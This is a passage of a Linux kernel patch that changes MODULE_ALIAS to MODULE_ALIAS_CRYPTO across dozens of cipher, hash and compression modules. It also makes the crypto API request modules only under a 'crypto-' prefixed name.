MODULE_DESCRIPTION(\"T10 DIF CRC calculation accelerated with PCLMULQDQ.\");\n MODULE_LICENSE(\"GPL\");\n \n-MODULE_ALIAS(\"crct10dif\");\n-MODULE_ALIAS(\"crct10dif-pclmul\");\n+MODULE_ALIAS_CRYPTO(\"crct10dif\");\n+MODULE_ALIAS_CRYPTO(\"crct10dif-pclmul\");\ndiff --git a\/arch\/x86\/crypto\/des3_ede_glue.c b\/arch\/x86\/crypto\/des3_ede_glue.c\nindex 0e9c0668fe4ec..38a14f818ef13 100644\n--- a\/arch\/x86\/crypto\/des3_ede_glue.c\n+++ b\/arch\/x86\/crypto\/des3_ede_glue.c\n@@ -502,8 +502,8 @@ module_exit(des3_ede_x86_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Triple DES EDE Cipher Algorithm, asm optimized\");\n-MODULE_ALIAS(\"des3_ede\");\n-MODULE_ALIAS(\"des3_ede-asm\");\n-MODULE_ALIAS(\"des\");\n-MODULE_ALIAS(\"des-asm\");\n+MODULE_ALIAS_CRYPTO(\"des3_ede\");\n+MODULE_ALIAS_CRYPTO(\"des3_ede-asm\");\n+MODULE_ALIAS_CRYPTO(\"des\");\n+MODULE_ALIAS_CRYPTO(\"des-asm\");\n MODULE_AUTHOR(\"Jussi Kivilinna <jussi.kivilinna@iki.fi>\");\ndiff --git a\/arch\/x86\/crypto\/ghash-clmulni-intel_glue.c b\/arch\/x86\/crypto\/ghash-clmulni-intel_glue.c\nindex 88bb7ba8b1753..8253d85aa1650 100644\n--- a\/arch\/x86\/crypto\/ghash-clmulni-intel_glue.c\n+++ b\/arch\/x86\/crypto\/ghash-clmulni-intel_glue.c\n@@ -341,4 +341,4 @@ module_exit(ghash_pclmulqdqni_mod_exit);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"GHASH Message Digest Algorithm, \"\n \t\t   \"acclerated by PCLMULQDQ-NI\");\n-MODULE_ALIAS(\"ghash\");\n+MODULE_ALIAS_CRYPTO(\"ghash\");\ndiff --git a\/arch\/x86\/crypto\/salsa20_glue.c b\/arch\/x86\/crypto\/salsa20_glue.c\nindex 5e8e67739bb50..399a29d067d63 100644\n--- a\/arch\/x86\/crypto\/salsa20_glue.c\n+++ b\/arch\/x86\/crypto\/salsa20_glue.c\n@@ -119,5 +119,5 @@ module_exit(fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION (\"Salsa20 stream cipher algorithm (optimized assembly version)\");\n-MODULE_ALIAS(\"salsa20\");\n-MODULE_ALIAS(\"salsa20-asm\");\n+MODULE_ALIAS_CRYPTO(\"salsa20\");\n+MODULE_ALIAS_CRYPTO(\"salsa20-asm\");\ndiff --git a\/arch\/x86\/crypto\/serpent_avx2_glue.c b\/arch\/x86\/crypto\/serpent_avx2_glue.c\nindex 2fae489b15246..437e47a4d302f 100644\n--- a\/arch\/x86\/crypto\/serpent_avx2_glue.c\n+++ b\/arch\/x86\/crypto\/serpent_avx2_glue.c\n@@ -558,5 +558,5 @@ module_exit(fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Serpent Cipher Algorithm, AVX2 optimized\");\n-MODULE_ALIAS(\"serpent\");\n-MODULE_ALIAS(\"serpent-asm\");\n+MODULE_ALIAS_CRYPTO(\"serpent\");\n+MODULE_ALIAS_CRYPTO(\"serpent-asm\");\ndiff --git a\/arch\/x86\/crypto\/serpent_avx_glue.c b\/arch\/x86\/crypto\/serpent_avx_glue.c\nindex ff48708709725..7e217398b4eb1 100644\n--- a\/arch\/x86\/crypto\/serpent_avx_glue.c\n+++ b\/arch\/x86\/crypto\/serpent_avx_glue.c\n@@ -617,4 +617,4 @@ module_exit(serpent_exit);\n \n MODULE_DESCRIPTION(\"Serpent Cipher Algorithm, AVX optimized\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"serpent\");\n+MODULE_ALIAS_CRYPTO(\"serpent\");\ndiff --git a\/arch\/x86\/crypto\/serpent_sse2_glue.c b\/arch\/x86\/crypto\/serpent_sse2_glue.c\nindex 8c95f86373061..bf025adaea01b 100644\n--- a\/arch\/x86\/crypto\/serpent_sse2_glue.c\n+++ b\/arch\/x86\/crypto\/serpent_sse2_glue.c\n@@ -618,4 +618,4 @@ module_exit(serpent_sse2_exit);\n \n MODULE_DESCRIPTION(\"Serpent Cipher Algorithm, SSE2 optimized\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"serpent\");\n+MODULE_ALIAS_CRYPTO(\"serpent\");\ndiff --git a\/arch\/x86\/crypto\/sha1_ssse3_glue.c b\/arch\/x86\/crypto\/sha1_ssse3_glue.c\nindex 74d16ef707c79..6c20fe04a738d 100644\n--- a\/arch\/x86\/crypto\/sha1_ssse3_glue.c\n+++ b\/arch\/x86\/crypto\/sha1_ssse3_glue.c\n@@ -278,4 +278,4 @@ module_exit(sha1_ssse3_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA1 Secure Hash Algorithm, Supplemental SSE3 accelerated\");\n \n-MODULE_ALIAS(\"sha1\");\n+MODULE_ALIAS_CRYPTO(\"sha1\");\ndiff --git a\/arch\/x86\/crypto\/sha256_ssse3_glue.c b\/arch\/x86\/crypto\/sha256_ssse3_glue.c\nindex f248546da1caa..4dc100d829025 100644\n--- a\/arch\/x86\/crypto\/sha256_ssse3_glue.c\n+++ b\/arch\/x86\/crypto\/sha256_ssse3_glue.c\n@@ -318,5 +318,5 @@ module_exit(sha256_ssse3_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA256 Secure Hash Algorithm, Supplemental SSE3 accelerated\");\n \n-MODULE_ALIAS(\"sha256\");\n-MODULE_ALIAS(\"sha224\");\n+MODULE_ALIAS_CRYPTO(\"sha256\");\n+MODULE_ALIAS_CRYPTO(\"sha224\");\ndiff --git a\/arch\/x86\/crypto\/sha512_ssse3_glue.c b\/arch\/x86\/crypto\/sha512_ssse3_glue.c\nindex 8626b03e83b75..26a5898a6f266 100644\n--- a\/arch\/x86\/crypto\/sha512_ssse3_glue.c\n+++ b\/arch\/x86\/crypto\/sha512_ssse3_glue.c\n@@ -326,5 +326,5 @@ module_exit(sha512_ssse3_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA512 Secure Hash Algorithm, Supplemental SSE3 accelerated\");\n \n-MODULE_ALIAS(\"sha512\");\n-MODULE_ALIAS(\"sha384\");\n+MODULE_ALIAS_CRYPTO(\"sha512\");\n+MODULE_ALIAS_CRYPTO(\"sha384\");\ndiff --git a\/arch\/x86\/crypto\/twofish_avx_glue.c b\/arch\/x86\/crypto\/twofish_avx_glue.c\nindex 4e3c665be1296..1ac531ea9bccc 100644\n--- a\/arch\/x86\/crypto\/twofish_avx_glue.c\n+++ b\/arch\/x86\/crypto\/twofish_avx_glue.c\n@@ -579,4 +579,4 @@ module_exit(twofish_exit);\n \n MODULE_DESCRIPTION(\"Twofish Cipher Algorithm, AVX optimized\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"twofish\");\n+MODULE_ALIAS_CRYPTO(\"twofish\");\ndiff --git a\/arch\/x86\/crypto\/twofish_glue.c b\/arch\/x86\/crypto\/twofish_glue.c\nindex 0a5202303501e..77e06c2da83d0 100644\n--- a\/arch\/x86\/crypto\/twofish_glue.c\n+++ b\/arch\/x86\/crypto\/twofish_glue.c\n@@ -96,5 +96,5 @@ module_exit(fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION (\"Twofish Cipher Algorithm, asm optimized\");\n-MODULE_ALIAS(\"twofish\");\n-MODULE_ALIAS(\"twofish-asm\");\n+MODULE_ALIAS_CRYPTO(\"twofish\");\n+MODULE_ALIAS_CRYPTO(\"twofish-asm\");\ndiff --git a\/arch\/x86\/crypto\/twofish_glue_3way.c b\/arch\/x86\/crypto\/twofish_glue_3way.c\nindex 13e63b3e1dfb4..56d8a08ee4790 100644\n--- a\/arch\/x86\/crypto\/twofish_glue_3way.c\n+++ b\/arch\/x86\/crypto\/twofish_glue_3way.c\n@@ -495,5 +495,5 @@ module_exit(fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Twofish Cipher Algorithm, 3-way parallel asm optimized\");\n-MODULE_ALIAS(\"twofish\");\n-MODULE_ALIAS(\"twofish-asm\");\n+MODULE_ALIAS_CRYPTO(\"twofish\");\n+MODULE_ALIAS_CRYPTO(\"twofish-asm\");\ndiff --git a\/crypto\/842.c b\/crypto\/842.c\nindex 65c7a89cfa090..b48f4f108c474 100644\n--- a\/crypto\/842.c\n+++ b\/crypto\/842.c\n@@ -180,3 +180,4 @@ module_exit(nx842_mod_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"842 Compression Algorithm\");\n+MODULE_ALIAS_CRYPTO(\"842\");\ndiff --git a\/crypto\/aes_generic.c b\/crypto\/aes_generic.c\nindex fd0d6b454975c..9b3c54c1cbe82 100644\n--- a\/crypto\/aes_generic.c\n+++ b\/crypto\/aes_generic.c\n@@ -1474,4 +1474,4 @@ module_exit(aes_fini);\n \n MODULE_DESCRIPTION(\"Rijndael (AES) Cipher Algorithm\");\n MODULE_LICENSE(\"Dual BSD\/GPL\");\n-MODULE_ALIAS(\"aes\");\n+MODULE_ALIAS_CRYPTO(\"aes\");\ndiff --git a\/crypto\/ansi_cprng.c b\/crypto\/ansi_cprng.c\nindex 666f1962a160f..b4485a108389a 100644\n--- a\/crypto\/ansi_cprng.c\n+++ b\/crypto\/ansi_cprng.c\n@@ -476,4 +476,4 @@ module_param(dbg, int, 0);\n MODULE_PARM_DESC(dbg, \"Boolean to enable debugging (0\/1 == off\/on)\");\n module_init(prng_mod_init);\n module_exit(prng_mod_fini);\n-MODULE_ALIAS(\"stdrng\");\n+MODULE_ALIAS_CRYPTO(\"stdrng\");\ndiff --git a\/crypto\/anubis.c b\/crypto\/anubis.c\nindex 008c8a4fb67ca..4bb187c2a9027 100644\n--- a\/crypto\/anubis.c\n+++ b\/crypto\/anubis.c\n@@ -704,3 +704,4 @@ module_exit(anubis_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Anubis Cryptographic Algorithm\");\n+MODULE_ALIAS_CRYPTO(\"anubis\");\ndiff --git a\/crypto\/api.c b\/crypto\/api.c\nindex a2b39c5f3649d..2a81e98a00210 100644\n--- a\/crypto\/api.c\n+++ b\/crypto\/api.c\n@@ -216,11 +216,11 @@ struct crypto_alg *crypto_larval_lookup(const char *name, u32 type, u32 mask)\n \n \talg = crypto_alg_lookup(name, type, mask);\n \tif (!alg) {\n-\t\trequest_module(\"%s\", name);\n+\t\trequest_module(\"crypto-%s\", name);\n \n \t\tif (!((type ^ CRYPTO_ALG_NEED_FALLBACK) & mask &\n \t\t      CRYPTO_ALG_NEED_FALLBACK))\n-\t\t\trequest_module(\"%s-all\", name);\n+\t\t\trequest_module(\"crypto-%s-all\", name);\n \n \t\talg = crypto_alg_lookup(name, type, mask);\n \t}\ndiff --git a\/crypto\/arc4.c b\/crypto\/arc4.c\nindex 5a772c3657d58..f1a81925558fa 100644\n--- a\/crypto\/arc4.c\n+++ b\/crypto\/arc4.c\n@@ -166,3 +166,4 @@ module_exit(arc4_exit);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"ARC4 Cipher Algorithm\");\n MODULE_AUTHOR(\"Jon Oberheide <jon@oberheide.org>\");\n+MODULE_ALIAS_CRYPTO(\"arc4\");\ndiff --git a\/crypto\/blowfish_generic.c b\/crypto\/blowfish_generic.c\nindex 8baf5447d35b5..7bd71f02d0dde 100644\n--- a\/crypto\/blowfish_generic.c\n+++ b\/crypto\/blowfish_generic.c\n@@ -138,4 +138,4 @@ module_exit(blowfish_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Blowfish Cipher Algorithm\");\n-MODULE_ALIAS(\"blowfish\");\n+MODULE_ALIAS_CRYPTO(\"blowfish\");\ndiff --git a\/crypto\/camellia_generic.c b\/crypto\/camellia_generic.c\nindex 26bcd7a2d6b47..1b74c5a3e8910 100644\n--- a\/crypto\/camellia_generic.c\n+++ b\/crypto\/camellia_generic.c\n@@ -1098,4 +1098,4 @@ module_exit(camellia_fini);\n \n MODULE_DESCRIPTION(\"Camellia Cipher Algorithm\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"camellia\");\n+MODULE_ALIAS_CRYPTO(\"camellia\");\ndiff --git a\/crypto\/cast5_generic.c b\/crypto\/cast5_generic.c\nindex 5558f630a0ebd..84c86db67ec7a 100644\n--- a\/crypto\/cast5_generic.c\n+++ b\/crypto\/cast5_generic.c\n@@ -549,4 +549,4 @@ module_exit(cast5_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Cast5 Cipher Algorithm\");\n-MODULE_ALIAS(\"cast5\");\n+MODULE_ALIAS_CRYPTO(\"cast5\");\ndiff --git a\/crypto\/cast6_generic.c b\/crypto\/cast6_generic.c\nindex de732528a4304..f408f0bd8de25 100644\n--- a\/crypto\/cast6_generic.c\n+++ b\/crypto\/cast6_generic.c\n@@ -291,4 +291,4 @@ module_exit(cast6_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Cast6 Cipher Algorithm\");\n-MODULE_ALIAS(\"cast6\");\n+MODULE_ALIAS_CRYPTO(\"cast6\");\ndiff --git a\/crypto\/ccm.c b\/crypto\/ccm.c\nindex 1df84217f7c93..647575b412815 100644\n--- a\/crypto\/ccm.c\n+++ b\/crypto\/ccm.c\n@@ -879,5 +879,5 @@ module_exit(crypto_ccm_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Counter with CBC MAC\");\n-MODULE_ALIAS(\"ccm_base\");\n-MODULE_ALIAS(\"rfc4309\");\n+MODULE_ALIAS_CRYPTO(\"ccm_base\");\n+MODULE_ALIAS_CRYPTO(\"rfc4309\");\ndiff --git a\/crypto\/crc32.c b\/crypto\/crc32.c\nindex 9d1c41569898a..187ded28cb0bd 100644\n--- a\/crypto\/crc32.c\n+++ b\/crypto\/crc32.c\n@@ -156,3 +156,4 @@ module_exit(crc32_mod_fini);\n MODULE_AUTHOR(\"Alexander Boyko <alexander_boyko@xyratex.com>\");\n MODULE_DESCRIPTION(\"CRC32 calculations wrapper for lib\/crc32\");\n MODULE_LICENSE(\"GPL\");\n+MODULE_ALIAS_CRYPTO(\"crc32\");\ndiff --git a\/crypto\/crc32c_generic.c b\/crypto\/crc32c_generic.c\nindex d9c7beba8e502..2a062025749d9 100644\n--- a\/crypto\/crc32c_generic.c\n+++ b\/crypto\/crc32c_generic.c\n@@ -170,5 +170,5 @@ module_exit(crc32c_mod_fini);\n MODULE_AUTHOR(\"Clay Haapala <chaapala@cisco.com>\");\n MODULE_DESCRIPTION(\"CRC32c (Castagnoli) calculations wrapper for lib\/crc32c\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"crc32c\");\n+MODULE_ALIAS_CRYPTO(\"crc32c\");\n MODULE_SOFTDEP(\"pre: crc32c\");\ndiff --git a\/crypto\/crct10dif_generic.c b\/crypto\/crct10dif_generic.c\nindex 877e7114ec5cb..08bb4f5045208 100644\n--- a\/crypto\/crct10dif_generic.c\n+++ b\/crypto\/crct10dif_generic.c\n@@ -124,4 +124,4 @@ module_exit(crct10dif_mod_fini);\n MODULE_AUTHOR(\"Tim Chen <tim.c.chen@linux.intel.com>\");\n MODULE_DESCRIPTION(\"T10 DIF CRC calculation.\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"crct10dif\");\n+MODULE_ALIAS_CRYPTO(\"crct10dif\");\ndiff --git a\/crypto\/crypto_null.c b\/crypto\/crypto_null.c\nindex 1dc54bb95a876..a20319132e338 100644\n--- a\/crypto\/crypto_null.c\n+++ b\/crypto\/crypto_null.c\n@@ -145,9 +145,9 @@ static struct crypto_alg null_algs[3] = { {\n \t.coa_decompress\t\t=\tnull_compress } }\n } };\n \n-MODULE_ALIAS(\"compress_null\");\n-MODULE_ALIAS(\"digest_null\");\n-MODULE_ALIAS(\"cipher_null\");\n+MODULE_ALIAS_CRYPTO(\"compress_null\");\n+MODULE_ALIAS_CRYPTO(\"digest_null\");\n+MODULE_ALIAS_CRYPTO(\"cipher_null\");\n \n static int __init crypto_null_mod_init(void)\n {\ndiff --git a\/crypto\/ctr.c b\/crypto\/ctr.c\nindex f2b94f27bb2cf..3d81ff7e6b489 100644\n--- a\/crypto\/ctr.c\n+++ b\/crypto\/ctr.c\n@@ -466,4 +466,4 @@ module_exit(crypto_ctr_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"CTR Counter block mode\");\n-MODULE_ALIAS(\"rfc3686\");\n+MODULE_ALIAS_CRYPTO(\"rfc3686\");\ndiff --git a\/crypto\/deflate.c b\/crypto\/deflate.c\nindex b57d70eb156b8..95d8d37c50218 100644\n--- a\/crypto\/deflate.c\n+++ b\/crypto\/deflate.c\n@@ -222,4 +222,4 @@ module_exit(deflate_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Deflate Compression Algorithm for IPCOMP\");\n MODULE_AUTHOR(\"James Morris <jmorris@intercode.com.au>\");\n-\n+MODULE_ALIAS_CRYPTO(\"deflate\");\ndiff --git a\/crypto\/des_generic.c b\/crypto\/des_generic.c\nindex 298d464ab7d25..42912948776b1 100644\n--- a\/crypto\/des_generic.c\n+++ b\/crypto\/des_generic.c\n@@ -983,7 +983,7 @@ static struct crypto_alg des_algs[2] = { {\n \t.cia_decrypt\t\t=\tdes3_ede_decrypt } }\n } };\n \n-MODULE_ALIAS(\"des3_ede\");\n+MODULE_ALIAS_CRYPTO(\"des3_ede\");\n \n static int __init des_generic_mod_init(void)\n {\ndiff --git a\/crypto\/fcrypt.c b\/crypto\/fcrypt.c\nindex 021d7fec6bc89..77286ea28865b 100644\n--- a\/crypto\/fcrypt.c\n+++ b\/crypto\/fcrypt.c\n@@ -420,3 +420,4 @@ module_exit(fcrypt_mod_fini);\n MODULE_LICENSE(\"Dual BSD\/GPL\");\n MODULE_DESCRIPTION(\"FCrypt Cipher Algorithm\");\n MODULE_AUTHOR(\"David Howells <dhowells@redhat.com>\");\n+MODULE_ALIAS_CRYPTO(\"fcrypt\");\ndiff --git a\/crypto\/gcm.c b\/crypto\/gcm.c\nindex 276cdac567b6a..aefb74a3f522b 100644\n--- a\/crypto\/gcm.c\n+++ b\/crypto\/gcm.c\n@@ -1441,6 +1441,6 @@ module_exit(crypto_gcm_module_exit);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Galois\/Counter Mode\");\n MODULE_AUTHOR(\"Mikko Herranen <mh1@iki.fi>\");\n-MODULE_ALIAS(\"gcm_base\");\n-MODULE_ALIAS(\"rfc4106\");\n-MODULE_ALIAS(\"rfc4543\");\n+MODULE_ALIAS_CRYPTO(\"gcm_base\");\n+MODULE_ALIAS_CRYPTO(\"rfc4106\");\n+MODULE_ALIAS_CRYPTO(\"rfc4543\");\ndiff --git a\/crypto\/ghash-generic.c b\/crypto\/ghash-generic.c\nindex 9d3f0c69a86ff..4e97fae9666f6 100644\n--- a\/crypto\/ghash-generic.c\n+++ b\/crypto\/ghash-generic.c\n@@ -172,4 +172,4 @@ module_exit(ghash_mod_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"GHASH Message Digest Algorithm\");\n-MODULE_ALIAS(\"ghash\");\n+MODULE_ALIAS_CRYPTO(\"ghash\");\ndiff --git a\/crypto\/khazad.c b\/crypto\/khazad.c\nindex 60e7cd66facc8..873eb5ded6d7a 100644\n--- a\/crypto\/khazad.c\n+++ b\/crypto\/khazad.c\n@@ -880,3 +880,4 @@ module_exit(khazad_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Khazad Cryptographic Algorithm\");\n+MODULE_ALIAS_CRYPTO(\"khazad\");\ndiff --git a\/crypto\/krng.c b\/crypto\/krng.c\nindex a2d2b72fc135b..67c88b3312107 100644\n--- a\/crypto\/krng.c\n+++ b\/crypto\/krng.c\n@@ -62,4 +62,4 @@ module_exit(krng_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Kernel Random Number Generator\");\n-MODULE_ALIAS(\"stdrng\");\n+MODULE_ALIAS_CRYPTO(\"stdrng\");\ndiff --git a\/crypto\/lz4.c b\/crypto\/lz4.c\nindex 34d072b72a734..aefbceaf3104f 100644\n--- a\/crypto\/lz4.c\n+++ b\/crypto\/lz4.c\n@@ -104,3 +104,4 @@ module_exit(lz4_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"LZ4 Compression Algorithm\");\n+MODULE_ALIAS_CRYPTO(\"lz4\");\ndiff --git a\/crypto\/lz4hc.c b\/crypto\/lz4hc.c\nindex 9218b3fed5e37..a1d3b5bd3d851 100644\n--- a\/crypto\/lz4hc.c\n+++ b\/crypto\/lz4hc.c\n@@ -104,3 +104,4 @@ module_exit(lz4hc_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"LZ4HC Compression Algorithm\");\n+MODULE_ALIAS_CRYPTO(\"lz4hc\");\ndiff --git a\/crypto\/lzo.c b\/crypto\/lzo.c\nindex a8ff2f778dc49..4b3e92525dac5 100644\n--- a\/crypto\/lzo.c\n+++ b\/crypto\/lzo.c\n@@ -107,3 +107,4 @@ module_exit(lzo_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"LZO Compression Algorithm\");\n+MODULE_ALIAS_CRYPTO(\"lzo\");\ndiff --git a\/crypto\/md4.c b\/crypto\/md4.c\nindex 0477a6a01d582..3515af425cc91 100644\n--- a\/crypto\/md4.c\n+++ b\/crypto\/md4.c\n@@ -255,4 +255,4 @@ module_exit(md4_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"MD4 Message Digest Algorithm\");\n-\n+MODULE_ALIAS_CRYPTO(\"md4\");\ndiff --git a\/crypto\/md5.c b\/crypto\/md5.c\nindex 7febeaab923bc..36f5e5b103f30 100644\n--- a\/crypto\/md5.c\n+++ b\/crypto\/md5.c\n@@ -168,3 +168,4 @@ module_exit(md5_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"MD5 Message Digest Algorithm\");\n+MODULE_ALIAS_CRYPTO(\"md5\");\ndiff --git a\/crypto\/michael_mic.c b\/crypto\/michael_mic.c\nindex 079b761bc70d1..46195e0d0f4d1 100644\n--- a\/crypto\/michael_mic.c\n+++ b\/crypto\/michael_mic.c\n@@ -184,3 +184,4 @@ module_exit(michael_mic_exit);\n MODULE_LICENSE(\"GPL v2\");\n MODULE_DESCRIPTION(\"Michael MIC\");\n MODULE_AUTHOR(\"Jouni Malinen <j@w1.fi>\");\n+MODULE_ALIAS_CRYPTO(\"michael_mic\");\ndiff --git a\/crypto\/rmd128.c b\/crypto\/rmd128.c\nindex 8a0f68b7f257f..049486ede938f 100644\n--- a\/crypto\/rmd128.c\n+++ b\/crypto\/rmd128.c\n@@ -327,3 +327,4 @@ module_exit(rmd128_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Adrian-Ken Rueegsegger <ken@codelabs.ch>\");\n MODULE_DESCRIPTION(\"RIPEMD-128 Message Digest\");\n+MODULE_ALIAS_CRYPTO(\"rmd128\");\ndiff --git a\/crypto\/rmd160.c b\/crypto\/rmd160.c\nindex 525d7bb752cf6..de585e51d455f 100644\n--- a\/crypto\/rmd160.c\n+++ b\/crypto\/rmd160.c\n@@ -371,3 +371,4 @@ module_exit(rmd160_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Adrian-Ken Rueegsegger <ken@codelabs.ch>\");\n MODULE_DESCRIPTION(\"RIPEMD-160 Message Digest\");\n+MODULE_ALIAS_CRYPTO(\"rmd160\");\ndiff --git a\/crypto\/rmd256.c b\/crypto\/rmd256.c\nindex 69293d9b56e0c..4ec02a754e099 100644\n--- a\/crypto\/rmd256.c\n+++ b\/crypto\/rmd256.c\n@@ -346,3 +346,4 @@ module_exit(rmd256_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Adrian-Ken Rueegsegger <ken@codelabs.ch>\");\n MODULE_DESCRIPTION(\"RIPEMD-256 Message Digest\");\n+MODULE_ALIAS_CRYPTO(\"rmd256\");\ndiff --git a\/crypto\/rmd320.c b\/crypto\/rmd320.c\nindex 09f97dfdfbba3..770f2cb369f87 100644\n--- a\/crypto\/rmd320.c\n+++ b\/crypto\/rmd320.c\n@@ -395,3 +395,4 @@ module_exit(rmd320_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Adrian-Ken Rueegsegger <ken@codelabs.ch>\");\n MODULE_DESCRIPTION(\"RIPEMD-320 Message Digest\");\n+MODULE_ALIAS_CRYPTO(\"rmd320\");\ndiff --git a\/crypto\/salsa20_generic.c b\/crypto\/salsa20_generic.c\nindex 9a4770c022841..3d0f9df30ac9f 100644\n--- a\/crypto\/salsa20_generic.c\n+++ b\/crypto\/salsa20_generic.c\n@@ -248,4 +248,4 @@ module_exit(salsa20_generic_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION (\"Salsa20 stream cipher algorithm\");\n-MODULE_ALIAS(\"salsa20\");\n+MODULE_ALIAS_CRYPTO(\"salsa20\");\ndiff --git a\/crypto\/seed.c b\/crypto\/seed.c\nindex 9c904d6d21514..c6ba8438be430 100644\n--- a\/crypto\/seed.c\n+++ b\/crypto\/seed.c\n@@ -476,3 +476,4 @@ module_exit(seed_fini);\n MODULE_DESCRIPTION(\"SEED Cipher Algorithm\");\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Hye-Shik Chang <perky@FreeBSD.org>, Kim Hyun <hkim@kisa.or.kr>\");\n+MODULE_ALIAS_CRYPTO(\"seed\");\ndiff --git a\/crypto\/serpent_generic.c b\/crypto\/serpent_generic.c\nindex 7ddbd7e888595..a53b5e2af335c 100644\n--- a\/crypto\/serpent_generic.c\n+++ b\/crypto\/serpent_generic.c\n@@ -665,5 +665,5 @@ module_exit(serpent_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Serpent and tnepres (kerneli compatible serpent reversed) Cipher Algorithm\");\n MODULE_AUTHOR(\"Dag Arne Osvik <osvik@ii.uib.no>\");\n-MODULE_ALIAS(\"tnepres\");\n-MODULE_ALIAS(\"serpent\");\n+MODULE_ALIAS_CRYPTO(\"tnepres\");\n+MODULE_ALIAS_CRYPTO(\"serpent\");\ndiff --git a\/crypto\/sha1_generic.c b\/crypto\/sha1_generic.c\nindex 7bb0474327821..039e58cfa1556 100644\n--- a\/crypto\/sha1_generic.c\n+++ b\/crypto\/sha1_generic.c\n@@ -153,4 +153,4 @@ module_exit(sha1_generic_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA1 Secure Hash Algorithm\");\n \n-MODULE_ALIAS(\"sha1\");\n+MODULE_ALIAS_CRYPTO(\"sha1\");\ndiff --git a\/crypto\/sha256_generic.c b\/crypto\/sha256_generic.c\nindex 65e7b76b057fc..5eb21b1200333 100644\n--- a\/crypto\/sha256_generic.c\n+++ b\/crypto\/sha256_generic.c\n@@ -384,5 +384,5 @@ module_exit(sha256_generic_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA-224 and SHA-256 Secure Hash Algorithm\");\n \n-MODULE_ALIAS(\"sha224\");\n-MODULE_ALIAS(\"sha256\");\n+MODULE_ALIAS_CRYPTO(\"sha224\");\n+MODULE_ALIAS_CRYPTO(\"sha256\");\ndiff --git a\/crypto\/sha512_generic.c b\/crypto\/sha512_generic.c\nindex 95db67197cd99..8d0b19ed4f4b3 100644\n--- a\/crypto\/sha512_generic.c\n+++ b\/crypto\/sha512_generic.c\n@@ -288,5 +288,5 @@ module_exit(sha512_generic_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA-512 and SHA-384 Secure Hash Algorithms\");\n \n-MODULE_ALIAS(\"sha384\");\n-MODULE_ALIAS(\"sha512\");\n+MODULE_ALIAS_CRYPTO(\"sha384\");\n+MODULE_ALIAS_CRYPTO(\"sha512\");\ndiff --git a\/crypto\/tea.c b\/crypto\/tea.c\nindex 0a572323ee4a9..495be2d0077d4 100644\n--- a\/crypto\/tea.c\n+++ b\/crypto\/tea.c\n@@ -270,8 +270,8 @@ static void __exit tea_mod_fini(void)\n \tcrypto_unregister_algs(tea_algs, ARRAY_SIZE(tea_algs));\n }\n \n-MODULE_ALIAS(\"xtea\");\n-MODULE_ALIAS(\"xeta\");\n+MODULE_ALIAS_CRYPTO(\"xtea\");\n+MODULE_ALIAS_CRYPTO(\"xeta\");\n \n module_init(tea_mod_init);\n module_exit(tea_mod_fini);\ndiff --git a\/crypto\/tgr192.c b\/crypto\/tgr192.c\nindex 3c7af0d1ff7a6..6e5651c66cf8a 100644\n--- a\/crypto\/tgr192.c\n+++ b\/crypto\/tgr192.c\n@@ -676,8 +676,8 @@ static void __exit tgr192_mod_fini(void)\n \tcrypto_unregister_shashes(tgr_algs, ARRAY_SIZE(tgr_algs));\n }\n 